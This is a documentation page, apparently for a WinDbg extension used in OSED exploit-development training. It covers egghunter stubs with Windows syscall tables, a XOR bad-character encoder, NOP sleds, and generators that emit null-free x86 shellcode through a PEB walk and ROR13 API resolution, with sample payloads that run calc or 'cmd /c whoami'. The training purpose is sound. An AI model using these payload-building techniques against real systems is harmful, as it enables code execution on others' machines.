# Shellcode commands

Use these commands to build the egghunter, write custom shellcode, encode a payload around bad characters, and pad the landing zone.

Run each command as `dx @$osed().<command>` in WinDbg. The [command index](../COMMANDS.md#conventions) explains byte lists, addresses, and optional arguments. `dx @$osed().help("<command>", "full")` prints the built-in help. Append `.explain` to any call, as in `dx @$osed().modules().explain`, for a plain-language explanation and a report sentence.

| Command | What it does |
| --- | --- |
| [`egghunter`](#egghunter) | Print an egghunter stub for a 4-byte tag, as hex and as Python bytes, and flag stub bytes that are bad characters. |
| [`encode`](#encode) | XOR-encode a payload so that it contains none of the excluded bytes, and print the decoder stub with it. |
| [`nop`](#nop) | Print a NOP sled of `length` bytes. |
| [`sc.push_string`](#scpush_string) | Print x86 pushes that build a NUL-terminated string on the stack with no `00` or bad byte. |
| [`sc.call_frame`](#sccall_frame) | Print the pushes and calls for one stdcall API call through the `sc.template` resolver, with the ROR13 hash. |
| [`sc.template`](#sctemplate) | Print a complete `build_sc.py` that assembles custom shellcode with Keystone and reports every bad byte. |
| [`sc.builder`](#scbuilder) | Print `sc_builder.py`: list the API calls in its `CONFIG`, run it, and get shellcode checked for bad bytes, size, and forward calls. |

### egghunter

Print an egghunter stub for a 4-byte tag, as hex and as Python bytes, and flag stub bytes that are bad characters.

```text
egghunter(tag?, mode?, wow64?, badchars?, os?, syscall?)
```

```text
dx @$osed().egghunter("W00T", "ntaccess", true, "00 0A 0D", "win10")
dx @$osed().egghunter("W00T", "ntaccess", false, "00 0A 0D", "win10-1909")
dx @$osed().egghunter("W00T", "ntaccess", false, "", "19041")
dx @$osed().egghunter("W00T", "ntaccess", false, "", "", 0x1C8)
dx @$osed().egghunter("W00T", "ntdisplay", false, "00 0A 0D", "win7")
dx @$osed().egghunter("B33F", "seh")
```

Modes are `ntaccess` (default, `NtAccessCheckAndAuditAlarm`), `ntdisplay` (32 bytes, `NtDisplayString`, Windows 7 and older), and `seh` (67 bytes, no syscall). Put the tag twice in front of the payload, for example `b"W00TW00T"`.

Set `wow64` to `true` for a 32-bit process on 64-bit Windows 10 or 11. The native stub (32 to 36 bytes) calls `int 0x2e`, and WOW64 stops that with `STATUS_ILLEGAL_INSTRUCTION` (`0xC000001D`). The WOW64 stub (49 bytes on Windows 10 and 11) calls the 64-bit service through the gate at `fs:[0xC0]`, the same way the 32-bit `ntdll` does. `ntdisplay` has no WOW64 stub.

The syscall number depends on the Windows build, and a wrong number breaks the hunter. Pass `os` to take the number from the table below, or `syscall` to set it yourself. `syscall` wins over `os`. Without either, or with an `os` that the table does not list, the stub uses the Windows 10 22H2 number and prints a warning that names it. To read the number on the target, run `u ntdll!NtAccessCheckAndAuditAlarm L1` and take the `mov eax` value. In a WOW64 process that command shows the 64-bit number, which is the one the WOW64 stub needs.

| `os` | Build (`winver`) | Native 32-bit | WOW64 |
| --- | --- | --- | --- |
| `xp`, `2003`, `vista`, `win7` | 2600 to 7601 | `0x02` | not supported |
| `win8` | 9200 | `0x1AA` | not supported |
| `win8.1` | 9600 | `0x1AF` | not supported |
| `win10-1507` | 10240 | `0x1B7` | `0x29` |
| `win10-1511` | 10586 | `0x1BA` | `0x29` |
| `win10-1607` | 14393 | `0x1BC` | `0x29` |
| `win10-1703` | 15063 | `0x1C2` | `0x29` |
| `win10-1709` to `win10-1909` | 16299 to 18363 | `0x1C6` | `0x29` |
| `win10-2004`, `win10-20h2`, `win10-21h1` | 19041 to 19043 | `0x1C8` | `0x29` |
| `win10-21h2`, `win10-22h2`, `win10` | 19044, 19045 | `0x1C9` | `0x29` |
| `win11` | 22000 to 26200 | none | `0x29` |

`os` also takes the build number, such as `"19041"`. The numbers come from [j00ru's syscall tables](https://j00ru.vexillium.org/syscalls/nt/32/). On Windows 7 and 8 the WOW64 gate takes its arguments in other registers, so the WOW64 stub covers only Windows 10 and 11. `ntdisplay` takes its number from the same table: `0x43` for XP, `0x46` for Server 2003, and `0x6D` for Windows 7. Without `os` it uses the XP number and prints a warning. The Vista number (`0x80`) and every number from Windows 8 on do not fit the stub's `push imm8`, so for those builds the command stops with an error that tells you to use `ntaccess`.

Every stub is free of null bytes. `ntaccess` loads the syscall number with the shortest form that avoids `00` and the bad characters you pass: `push imm8 ; pop eax` up to `0x7F`, `xor eax, eax ; mov al` or `mov ah` for one non-zero byte, `xor eax, eax ; mov ax, imm16` for numbers such as `0x1C9`, and `mov eax, ~n ; not eax` when the number's own bytes are bad characters. That is why the stub size changes with the number. `seh` reaches its handler through a backward `call` instead of `call $+5`. The bad-character check covers the whole stub and the tag, so a warning means a byte in the loop itself, such as `0F` or `FF`; then run the hunter through [`encode`](#encode).

The Windows 10 WOW64 stub for tag `W00T`, 49 bytes, which found an egg in a WOW64 process on Windows 11:

```text
33DB53535353535353535353B3C06681CAFF0F4252526A295864FF135A5A3C0574ECB8573030548BFAAF75E7AF75E4FFE7
```

The `seh` stub needs DEP off for the process, because Windows rejects an exception handler outside a loaded image when DEP is on.

### encode

XOR-encode a payload so that it contains none of the excluded bytes, and print the decoder stub with it.

```text
encode(shellcode, exclude?, key?)
```

```text
dx @$osed().encode("FC E8 82 00 00 00 60", "00 0A 0D")
dx @$osed().encode("FC E8", "00 0A 0D", 0x41)
```

It picks a key that clears every excluded byte, or uses `key` when you pass one. The output has the key, the decoder stub, the encoded bytes, and the combined payload as Python bytes. Default excludes are `00 0A 0D`.

### nop

Print a NOP sled of `length` bytes.

```text
nop(length, byte?)
```

```text
dx @$osed().nop(16)
dx @$osed().nop(32)
dx @$osed().nop(16, 0x90)
```

`byte` defaults to `0x90`.

## Write custom shellcode

`sc.push_string`, `sc.call_frame`, `sc.template`, and `sc.builder` print assembly text and read nothing from the target, so they work in any process. They write 32-bit code only. Write one shellcode by hand first, with the PEB walk, the export walk, and the hash loop, before you rely on the generator. You then know what to change when a fixed line holds a bad character.

### sc.push_string

Print x86 pushes that build a NUL-terminated string on the stack with no `00` or bad byte.

```text
sc.push_string(text, badchars?, register?)
```

```text
dx @$osed().sc.push_string("calc.exe")
dx @$osed().sc.push_string("cmd /c dir", "00 0A 0D 20", "ebx")
```

The text is split into little-endian dwords, and the last dword is pushed first, so ESP ends at the first character. When the length is a multiple of 4, the terminator is a separate zero dword built with `xor reg, reg ; push reg`. A partial last dword holds `00` bytes, so it is built through a scratch register. The command tries `push imm`, then `mov reg, ~v ; not reg`, `mov reg, -v ; neg reg`, `mov reg, v ^ key ; xor reg, key`, and `mov reg, v - k ; add reg, k`. It keeps the first form whose bytes, opcodes included, avoid `00` and every bad character. The scratch register is `eax`, then `ecx`, then `edx`. Pass `register` to copy ESP into it after the pushes, before later pushes move ESP away from the string.

Each line shows its bytes and the 4 characters it pushes. The same lines then print as a Keystone `CODE` string:

```text
xor eax, eax     ; 31 C0
push eax         ; 50              "\0\0\0\0"
push 0x6578652e  ; 68 2E 65 78 65  ".exe"
push 0x636c6163  ; 68 63 61 6C 63  "calc"

CODE = (
    "xor eax, eax;"
    "push eax;"         # "\0\0\0\0"
    "push 0x6578652e;"  # ".exe"
    "push 0x636c6163;"  # "calc"
)
```

With spaces as bad characters, every dword that holds a space goes through a register:

```text
mov eax, 0xffff8d96  ; B8 96 8D FF FF
not eax              ; F7 D0
push eax             ; 50              "ir\0\0"
mov eax, 0x9bdf9cd0  ; B8 D0 9C DF 9B
not eax              ; F7 D0
push eax             ; 50              "/c d"
mov eax, 0xdf9b929c  ; B8 9C 92 9B DF
not eax              ; F7 D0
push eax             ; 50              "cmd "
mov ebx, esp         ; 89 E3           ebx -> "cmd /c dir"
```

`00` is always treated as bad. The command fails when the text is empty, when `register` is `esp`, or when no listed form avoids the bad characters.

### sc.call_frame

Print the pushes and calls for one stdcall API call through the `sc.template` resolver, with the ROR13 hash.

```text
sc.call_frame(api, args..., "bad=<list>"?)
```

```text
dx @$osed().sc.call_frame("WinExec", "<ptr to cmd>", "1")
dx @$osed().sc.call_frame("TerminateProcess", "-1", "0", "bad=00 0A 0D")
```

The arguments are pushed in reverse order, with one comment each. A number is pushed with the same null-free forms as `sc.push_string`, through a scratch register that no argument names. A register, an `[ebp±n]` slot, or any other expression is pushed as written. Text in angle brackets is marked as a placeholder to replace before you assemble. Then come the ROR13 hash of the export name, the module base, `call dword ptr [ebp-0x04]` to resolve the address, and `call eax`:

```text
push 0x1                   ; 6A 01           arg2 uCmdShow = 1
push <ptr to cmd>          ; ??              arg1 lpCmdLine = <ptr to cmd> (placeholder)
push 0xe8afe98             ; 68 98 FE 8A 0E  ROR13("WinExec") = 0x0e8afe98
push dword ptr [ebp-0x08]  ; FF 75 F8        kernel32 base
call dword ptr [ebp-0x04]  ; FF 55 FC        resolver: eax = WinExec
call eax                   ; FF D0           WinExec pops its 2 argument(s)
```

The frame assumes the `sc.template` slots below EBP: the resolver at `[ebp-0x04]`, the kernel32 base at `[ebp-0x08]`, and the last `LoadLibraryA` base at `[ebp-0x0c]`. A known API outside kernel32, such as `WSAStartup` or `MessageBoxA`, takes its base from `[ebp-0x0c]`. The prototype table names the arguments of `WinExec`, `ExitProcess`, `TerminateProcess`, `ExitThread`, `LoadLibraryA`, `GetProcAddress`, `VirtualAlloc`, `VirtualProtect`, `CreateProcessA`, `WaitForSingleObject`, `WSAStartup`, `WSASocketA`, `connect`, and `MessageBoxA`, and warns when the argument count differs. A known name typed in another case is hashed with its export spelling. An unknown name prints a warning and is hashed exactly as typed, because export names are case-sensitive. A fixed line that holds a bad character, such as `FF` in `push dword ptr [ebp-0x08]`, prints a warning that names the line.

### sc.template

Print a complete `build_sc.py` that assembles custom shellcode with Keystone and reports every bad byte.

```text
sc.template(task..., "bad=<list>"?)
```

```text
dx @$osed().sc.template("winexec=calc.exe", "exit")
dx @$osed().sc.template("show=0", "winexec=cmd.exe /c whoami > C:\\out.txt", "terminate", "bad=00 0A 0D 20")
dx @$osed().sc.template("loadlibrary=user32.dll", "getprocaddress=MessageBoxA")
```

Tasks run in the order you give them:

| Task | Code it adds |
| --- | --- |
| `winexec=<command line>` | Push the command with `sc.push_string`, then call `WinExec(ebx, show)`. |
| `loadlibrary=<dll>` | Call `LoadLibraryA(name)` and store the base at `[ebp-0x0c]`. |
| `getprocaddress=<export>` | Call `GetProcAddress([ebp-0x0c], name)` and store the address at `[ebp-0x10]`. Before any `loadlibrary` task, `[ebp-0x0c]` holds the kernel32 base. |
| `exit` | Call `ExitProcess(0)`. |
| `terminate` | Call `TerminateProcess(-1, 0)`, where `-1` is the current process. |
| `show=<n>` | Set `uCmdShow` for later `winexec` tasks. The default is 1. |
| `bad=<list>` | Set the bad characters for the generated pushes and for the script check. |

With no task you get `winexec=calc.exe` and `exit`. Without an exit task, the code returns to its caller, which suits a test loader that calls the shellcode.

The assembly has five parts:

1. `pushad ; mov ebp, esp ; add esp, 0xfffff810` saves the registers and reserves 0x7f0 bytes. An `add` of a negative number has no `00` byte, unlike `sub esp, 0x7f0`.
2. The kernel32 lookup reads the PEB through `fs:[ecx+0x30]`, then `Ldr` and `InInitializationOrderModuleList`. It takes the first module whose `BaseDllName` is 24 bytes long (12 UTF-16 characters) and starts with `K` in either case.
3. A short forward `jmp` reaches a backward `call`, which pushes the address of `resolve_hash` with a negative rel32 and no `00` byte. That address goes to `[ebp-0x04]`.
4. Each task adds its call frames. `resolve_hash(module_base, hash)` walks the export name table, hashes each name, and maps a match through the ordinal table to the function address in EAX, or 0 when no name matches. It pops both arguments and keeps every register except EAX. The hash loop uses `rol edx, 0x13`, which equals `ror edx, 13` and keeps the common bad character `0D` out of the code.
5. `mov esp, ebp ; popad ; ret` returns to the caller.

The Python part assembles the whole `ASM` list with `Ks(KS_ARCH_X86, KS_MODE_32)`. It also assembles each line alone at its final offset and checks that the lines add up to the whole. It then prints the size and each bad byte with its offset and its line, writes `shellcode.bin`, and prints the bytes as a `shellcode += b"\x.."` literal. The script exits with code 1 when a bad byte is present. The first lines for `sc.template("winexec=calc.exe", "exit")`:

```python
#!/usr/bin/env python3
# build_sc.py from osed-windbg sc.template("winexec=calc.exe", "exit")
# Needs Python 3 and keystone-engine (pip install keystone-engine).
import re
import sys

from keystone import Ks, KS_ARCH_X86, KS_MODE_32

BADCHARS = bytes([0x00])

ASM = [
    # Entry: save the caller's registers, open a frame, and move esp 0x7f0 bytes down.
    "pushad",
    "mov ebp, esp",
    "add esp, 0xfffff810",                # esp = ebp - 0x7f0; a sub of 0x7f0 would hold 00 bytes
```

The output of `python build_sc.py`:

```text
[+] 213 bytes
[+] 0 bad bytes against 00
[+] wrote shellcode.bin
shellcode = b""
shellcode += b"\x60\x89\xe5\x81\xc4\x10\xf8\xff\xff\x31\xc9\x64\x8b\x41\x30\x8b"
```

The default output holds no `00` byte, and the fixed routines also avoid `0A`, `0D`, and `20`. A bad character that you add can still hit a fixed line, for example `FF` in `call dword ptr [ebp-0x04]`. The script names that line, and you rewrite it by hand. The kernel32 match assumes that kernel32.dll is the first 12-character name that starts with `K` in initialization order. That held on Windows 10 build 19045 and Windows 11 build 26200, where a WinExec template ran in a 32-bit process.

To run the result, build `tests/manual/sc_writer/loader.c`, a 32-bit loader that copies `shellcode.bin` into RWX memory and calls it. The loader exits with `0x600D` when the shellcode returns. `tests/manual/sc_writer/check.py` assembles every line the three commands print with Keystone and compares the bytes.

### sc.builder

Print `sc_builder.py`, a config-driven builder: list the API calls at its top, run it, and get shellcode checked for bad bytes, size, and forward calls.

```text
sc.builder(task..., "bad=<list>"?, "xor"?, "max=<bytes>"?)
```

```text
dx @$osed().sc.builder()
dx @$osed().sc.builder("show=0", "winexec=cmd.exe /c whoami > C:\out.txt", "terminate", "bad=00 0A 0D 20 2F")
dx @$osed().sc.builder("winexec=calc.exe", "exit", "bad=00 0A 0D", "xor", "max=400")
```

With no argument the command prints the script exactly as `tools/sc_builder.py` in this repository; `npm run build` regenerates the embedded copy and a test fails when the two differ. Arguments take the `sc.template` tasks and fill the `CONFIG` block from them, so `winexec=`, `loadlibrary=`, `getprocaddress=`, `exit`, `terminate`, `show=`, and `bad=` work as above. `xor` sets `XOR_ENCODER = True` and `max=<bytes>` sets `MAX_SIZE`. For any other API sequence, save the script and edit `CONFIG`. It needs Python 3 and `keystone-engine`; `capstone` is optional.

`CONFIG` is the only part you edit:

| Name | Meaning |
| --- | --- |
| `BADCHARS` | Bytes the output may not contain, such as `b"\x00\x0a\x0d"`. `00` is always added. |
| `MAX_SIZE` | `None`, or the most bytes the shellcode may take. |
| `CALLS` | `(dll, api, [args])` in execution order. Export names are case-sensitive. A DLL other than kernel32.dll is loaded once with `LoadLibraryA`. |
| `EXIT` | `"terminate"` for `TerminateProcess(-1, 0)`, `"exit"` for `ExitProcess(0)`, `"ret"` to restore the registers and return. |
| `XOR_ENCODER` | `True` prepends a XOR decoder stub, as plan B when a bad byte remains. |

Each argument is listed in prototype order and pushed in reverse:

| Argument | Pushed value |
| --- | --- |
| an int | The dword, built by the shortest clean form: `push imm8`/`imm32`, `xor reg, reg` with `inc`/`dec` or `mov al`/`ax`, `push imm8 ; pop`, `mov` with `not`, `neg`, or a XOR key, or an `add`/`sub` split. |
| `s("text")` | The address of the NUL-terminated string, pushed on the stack before the arguments. |
| `w("text")` | The same for a UTF-16LE string, for W APIs. |
| `ref(n)` | The return value of call `n` in `CALLS`, counted from 1, such as a handle. |
| `buf(size)` | The address of `size` bytes of scratch space below EBP, for out-parameters. The space is not zeroed. |
| `base("dll")` | The base address of kernel32.dll or of a DLL that `CALLS` loads. |

Three configs:

```python
# Run a command, then end the process.
CALLS = [
    ("kernel32.dll", "WinExec", [s("cmd.exe /c whoami > C:\Users\Public\w.txt"), 0]),
]
EXIT = "terminate"

# A message box. The builder loads user32.dll with LoadLibraryA first.
CALLS = [
    ("user32.dll", "MessageBoxA", [0, s("Hello from sc_builder"), s("OSED"), 0]),
]
EXIT = "exit"

# Write a file: ref(1) is the handle from CreateFileA, buf(4) takes the byte count.
CALLS = [
    ("kernel32.dll", "CreateFileA", [s("C:\Users\Public\out.txt"), 0x40000000, 0, 0, 2, 0x80, 0]),
    ("kernel32.dll", "WriteFile", [ref(1), s("hello"), 5, buf(4), 0]),
    ("kernel32.dll", "CloseHandle", [ref(1)]),
]
EXIT = "ret"
```

The generated code has the same prologue, PEB walk, and backward-call resolver as `sc.template`. Then it resolves each API once: `LoadLibraryA` first when a DLL needs loading, each DLL base into its own slot, then every API address into a slot next to EBP, so a call is `call dword ptr [ebp-0x..]`. Before each call it pushes the call's strings, last dword first, and saves each address in a slot. A dword that holds a bad character is loaded as `mov eax, value ^ key ; xor eax, key`, with a key byte chosen so that both bytes are clean, and falls back to `not`, `neg`, or an `add`/`sub` split. The arguments follow in reverse, then the call, and `EAX` goes to a slot when a later `ref()` reads it. Slot offsets that are bad characters are skipped.

The script prints the ROR13 table, which you can check against `dx @$osed().sc.hash("<api>", "ROR13")`. It assembles each line alone at its final offset with Keystone and compares the result with one whole assembly. It lists the code, disassembled by Capstone when it is installed (and checked to decode line by line) or as the assembler input otherwise. It reports every bad byte with its offset and line, every `call` with a forward or `00`-holding rel32, and the size against `MAX_SIZE`. It writes `shellcode.bin` and prints a `shellcode += b"\x.."` literal. Exit code 1 means a check failed.

With `XOR_ENCODER = True` the script prepends a stub of about 20 bytes (22 for the 304-byte command above): a forward `jmp` to a backward `call` gives the encoded body's address, the stub XORs each byte in place with one key, and `ret` jumps into the decoded code. The key is the first one that keeps both the stub and the encoded body clean. The stub writes over the code, so the page must be writable; the script prints that warning.

The run of `python sc_builder.py` for the first config, with `BADCHARS = b"\x00\x0a\x0d\x20\x2f"` and the output file in `C:\Users\Public`, starts and ends like this:

```text
[+] 1 call(s), exit terminate, bad chars 00 0a 0d 20 2f
[+] ROR13 hashes; check one in WinDbg with dx @$osed().sc.hash("<api>", "ROR13")
    api                      dll              hash
    WinExec                  kernel32.dll     0x0e8afe98
    TerminateProcess         kernel32.dll     0x78b5b983
[+] code, 304 bytes:
    ...
    00e0  b8 21 42 3b 5d           mov eax, 0x5d3b4221
    00e5  35 01 01 01 01           xor eax, 0x1010101
    00ea  50                       push eax                                  ; " C:\" (xor key 0x1010101)
    ...
[+] 304 bytes
[+] 0 bad bytes against 00 0a 0d 20 2f
[+] 0 problems
[+] wrote shellcode.bin
```

`tests/manual/sc_builder/check.py` builds four configs: the command above, the message box, the file write, and the command with `XOR_ENCODER = True`. Each must exit 0 with no bad byte. With `--bundle dist/osed-legacy.js` it also checks that `sc.builder` with the matching tasks builds the same bytes. The command, the file write, and the XOR-encoded command ran in the `tests/manual/sc_writer/loader.c` loader in a 32-bit process on Windows 10 build 19045 and wrote their files.
